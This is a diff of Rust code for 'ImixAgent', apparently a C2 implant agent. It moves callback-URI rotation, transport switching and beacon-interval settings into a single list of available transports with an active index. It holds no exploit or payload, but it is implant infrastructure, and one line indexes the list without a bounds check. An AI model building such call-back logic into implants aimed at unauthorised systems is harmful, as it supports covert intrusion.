@@ -1,7 +1,7 @@
 use anyhow::{Context, Result};
 use eldritch_agent::Agent;
-use pb::c2::active_transport::Type;
 use pb::c2::host::Platform;
+use pb::c2::transport::Type::{self, *};
 use pb::c2::{self, ClaimTasksRequest};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
@@ -17,8 +17,6 @@ use crate::task::TaskRegistry;
 pub struct ImixAgent<T: Transport> {
     config: Arc<RwLock<Config>>,
     transport: Arc<RwLock<T>>,
-    callback_uris: Arc<RwLock<Vec<String>>>,
-    active_uri_idx: Arc<RwLock<usize>>,
     runtime_handle: tokio::runtime::Handle,
     pub task_registry: Arc<TaskRegistry>,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
@@ -32,19 +30,9 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         runtime_handle: tokio::runtime::Handle,
         task_registry: Arc<TaskRegistry>,
     ) -> Self {
-        //TODO: simplyify this section transport, callback_uris, active_uri_idx, and config seem to duplicate information.
-        let c = config.clone();
-        let active_transport = c
-            .info
-            .as_ref()
-            .and_then(|info| info.active_transport.as_ref());
-        let uri = active_transport.map(|t| t.uri.clone()).unwrap_or_default();
-
         Self {
             config: Arc::new(RwLock::new(config)),
             transport: Arc::new(RwLock::new(transport)),
-            callback_uris: Arc::new(RwLock::new(vec![uri])),
-            active_uri_idx: Arc::new(RwLock::new(0)),
             runtime_handle,
             task_registry,
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
@@ -62,10 +50,18 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             .info
             .as_ref()
             .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
-        let interval = info
-            .active_transport
+
+        let available_transports = info
+            .available_transports
             .as_ref()
-            .ok_or_else(|| anyhow::anyhow!("no active transport set"))?
+            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;
+
+        let active_idx = available_transports.active_index as usize;
+        let interval = available_transports
+            .transports
+            .get(active_idx)
+            .or_else(|| available_transports.transports.first())
+            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
             .interval;
 
         Ok(interval)
@@ -116,24 +112,21 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     }
 
     // Helper to get config URIs for creating new transport
-    pub async fn get_transport_config(&self) -> (String, Config) {
+    pub async fn get_transport_config(&self) -> Config {
         let config = self.config.read().await.clone();
-        let uris = self.callback_uris.read().await;
-        let idx = *self.active_uri_idx.read().await;
-        let callback_uri = if idx < uris.len() {
-            uris[idx].clone()
-        } else {
-            // Fallback, should not happen unless empty
-            uris.first().cloned().unwrap_or_default()
-        };
-        (callback_uri, config)
+        config
     }
 
     pub async fn rotate_callback_uri(&self) {
-        let uris = self.callback_uris.read().await;
-        let mut idx = self.active_uri_idx.write().await;
-        if !uris.is_empty() {
-            *idx = (*idx + 1) % uris.len();
+        let mut cfg = self.config.write().await;
+        if let Some(info) = cfg.info.as_mut() {
+            if let Some(available_transports) = info.available_transports.as_mut() {
+                let num_transports = available_transports.transports.len();
+                if num_transports > 0 {
+                    let current_idx = available_transports.active_index as usize;
+                    available_transports.active_index = ((current_idx + 1) % num_transports) as u32;
+                }
+            }
         }
     }
 
@@ -150,8 +143,8 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         }
 
         // 2. Create new transport from config
-        let (callback_uri, config) = self.get_transport_config().await;
-        let t = T::new(callback_uri, config).context("Failed to create on-demand transport")?;
+        let config = self.get_transport_config().await;
+        let t = T::new(config).context("Failed to create on-demand transport")?;
 
         #[cfg(debug_assertions)]
         log::debug!("Created on-demand transport for background task");
@@ -326,11 +319,19 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         let active_uri = self.get_active_callback_uri().unwrap_or_default();
         let config = cfg.clone();
 
-        let active_transport = config
+        let available_transports = config
             .info
             .as_ref()
-            .and_then(|info| info.active_transport.as_ref())
-            .context("failed to get active transport")
+            .and_then(|info| info.available_transports.as_ref())
+            .context("failed to get available transports")
+            .map_err(|e| e.to_string())?;
+
+        let active_idx = available_transports.active_index as usize;
+        let active_transport = available_transports
+            .transports
+            .get(active_idx)
+            .or_else(|| available_transports.transports.first())
+            .context("no transports configured")
             .map_err(|e| e.to_string())?;
 
         map.insert("callback_uri".to_string(), active_uri);
@@ -358,7 +359,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
                 );
                 map.insert("primary_ip".to_string(), host.primary_ip.clone());
             }
-            if let Some(active_transport) = &info.active_transport {
+            if let Some(available_transports) = &info.available_transports {
+                let idx = available_transports.active_index;
+                let active_transport = &available_transports.transports[idx as usize];
                 map.insert("uri".to_string(), active_transport.uri.clone());
                 map.insert(
                     "type".to_string(),
@@ -387,6 +390,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         })
     }
 
+    // TODO: This should probably be removed as schema and transport should be directly tied to one another.
     fn set_transport(&self, transport: String) -> Result<(), String> {
         let available = self.list_transports()?;
         if !available.contains(&transport) {
@@ -394,18 +398,33 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         }
 
         self.block_on(async {
-            let mut uris = self.callback_uris.write().await;
-            let idx_val = *self.active_uri_idx.read().await;
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                let active_idx = available_transports.active_index as usize;
+                if let Some(current_transport) = available_transports.transports.get(active_idx) {
+                    let current_uri = &current_transport.uri;
+                    // Create new URI with the new transport scheme
+                    // TODO: We probably don't need to decouple schema and uri
+                    let new_uri = if let Some(pos) = current_uri.find("://") {
+                        format!("{}://{}", transport, &current_uri[pos + 3..])
+                    } else {
+                        format!("{}://{}", transport, current_uri)
+                    };
 
-            // We update the current active URI with the new scheme
-            if idx_val < uris.len() {
-                let current_uri = &uris[idx_val];
-                if let Some(pos) = current_uri.find("://") {
-                    let new_uri = format!("{}://{}", transport, &current_uri[pos + 3..]);
-                    uris[idx_val] = new_uri;
-                } else {
-                    let new_uri = format!("{}://{}", transport, current_uri);
-                    uris[idx_val] = new_uri;
+                    // Create a new transport with the new URI
+                    let new_transport = pb::c2::Transport {
+                        uri: new_uri,
+                        interval: current_transport.interval,
+                        r#type: current_transport.r#type,
+                        extra: current_transport.extra.clone(),
+                    };
+
+                    // Append the new transport and update active_index
+                    available_transports.transports.push(new_transport);
+                    available_transports.active_index =
+                        (available_transports.transports.len() - 1) as u32;
                 }
             }
             Ok(())
@@ -425,9 +444,12 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             {
                 let mut cfg = self.config.write().await;
                 if let Some(info) = &mut cfg.info
-                    && let Some(active_transport) = &mut info.active_transport
+                    && let Some(available_transports) = &mut info.available_transports
                 {
-                    active_transport.interval = interval;
+                    let active_idx = available_transports.active_index as usize;
+                    if let Some(transport) = available_transports.transports.get_mut(active_idx) {
+                        transport.interval = interval;
+                    }
                 }
             }
             // We force a check-in to update the server with the new interval
@@ -438,14 +460,40 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn set_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
-            let mut uris = self.callback_uris.write().await;
-            let mut idx = self.active_uri_idx.write().await;
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                // Check if URI already exists
+                if let Some(pos) = available_transports
+                    .transports
+                    .iter()
+                    .position(|t| t.uri == uri)
+                {
+                    // Set active_index to existing transport
+                    available_transports.active_index = pos as u32;
+                } else {
+                    // Get current transport as template
+                    let active_idx = available_transports.active_index as usize;
+                    let template = available_transports
+                        .transports
+                        .get(active_idx)
+                        .or_else(|| available_transports.transports.first())
+                        .cloned();
 
-            if let Some(pos) = uris.iter().position(|x| *x == uri) {
-                *idx = pos;
-            } else {
-                uris.push(uri);
-                *idx = uris.len() - 1;
+                    if let Some(tmpl) = template {
+                        // Create new transport with the new URI
+                        let new_transport = pb::c2::Transport {
+                            uri,
+                            interval: tmpl.interval,
+                            r#type: tmpl.r#type,
+                            extra: tmpl.extra,
+                        };
+                        available_transports.transports.push(new_transport);
+                        available_transports.active_index =
+                            (available_transports.transports.len() - 1) as u32;
+                    }
+                }
             }
             Ok(())
         })
@@ -453,42 +501,81 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
         self.block_on(async {
-            let uris = self.callback_uris.read().await;
-            Ok(uris.iter().cloned().collect())
+            let cfg = self.config.read().await;
+            let uris: BTreeSet<String> = cfg
+                .info
+                .as_ref()
+                .and_then(|info| info.available_transports.as_ref())
+                .map(|at| at.transports.iter().map(|t| t.uri.clone()).collect())
+                .unwrap_or_default();
+            Ok(uris)
         })
     }
 
     fn get_active_callback_uri(&self) -> Result<String, String> {
         self.block_on(async {
-            let uris = self.callback_uris.read().await;
-            let idx = *self.active_uri_idx.read().await;
-            if idx < uris.len() {
-                Ok(uris[idx].clone())
-            } else {
-                uris.first()
-                    .cloned()
-                    .ok_or_else(|| "No callback URIs configured".to_string())
-            }
+            let cfg = self.config.read().await;
+            cfg.info
+                .as_ref()
+                .and_then(|info| info.available_transports.as_ref())
+                .and_then(|at| {
+                    let active_idx = at.active_index as usize;
+                    at.transports
+                        .get(active_idx)
+                        .or_else(|| at.transports.first())
+                })
+                .map(|t| t.uri.clone())
+                .ok_or_else(|| "No callback URIs configured".to_string())
         })
     }
 
     fn get_next_callback_uri(&self) -> Result<String, String> {
         self.block_on(async {
-            let uris = self.callback_uris.read().await;
-            let idx = *self.active_uri_idx.read().await;
-            if uris.is_empty() {
-                return Err("No callback URIs configured".to_string());
-            }
-            let next_idx = (idx + 1) % uris.len();
-            Ok(uris[next_idx].clone())
+            let cfg = self.config.read().await;
+            cfg.info
+                .as_ref()
+                .and_then(|info| info.available_transports.as_ref())
+                .and_then(|at| {
+                    if at.transports.is_empty() {
+                        return None;
+                    }
+                    let current_idx = at.active_index as usize;
+                    let next_idx = (current_idx + 1) % at.transports.len();
+                    at.transports.get(next_idx)
+                })
+                .map(|t| t.uri.clone())
+                .ok_or_else(|| "No callback URIs configured".to_string())
         })
     }
 
     fn add_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
-            let mut uris = self.callback_uris.write().await;
-            if !uris.contains(&uri) {
-                uris.push(uri);
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                // Check if URI already exists
+                if !available_transports.transports.iter().any(|t| t.uri == uri) {
+                    // Get current transport as template
+                    let template = available_transports
+                        .transports
+                        .first()
+                        .cloned()
+                        .unwrap_or_else(|| pb::c2::Transport {
+                            uri: uri.clone(),
+                            interval: 5,
+                            r#type: 0,
+                            extra: String::new(),
+                        });
+
+                    let new_transport = pb::c2::Transport {
+                        uri,
+                        interval: template.interval,
+                        r#type: template.r#type,
+                        extra: template.extra,
+                    };
+                    available_transports.transports.push(new_transport);
+                }
             }
             Ok(())
         })
@@ -496,13 +583,21 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
-            let mut uris = self.callback_uris.write().await;
-            if let Some(pos) = uris.iter().position(|x| *x == uri) {
-                uris.remove(pos);
-                // Adjust index if needed
-                let mut idx = self.active_uri_idx.write().await;
-                if *idx >= uris.len() && !uris.is_empty() {
-                    *idx = 0;
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+                && let Some(pos) = available_transports
+                    .transports
+                    .iter()
+                    .position(|t| t.uri == uri)
+            {
+                available_transports.transports.remove(pos);
+                // Adjust active_index if needed
+                let active_idx = available_transports.active_index as usize;
+                if active_idx >= available_transports.transports.len()
+                    && !available_transports.transports.is_empty()
+                {
+                    available_transports.active_index = 0;
                 }
             }
             Ok(())
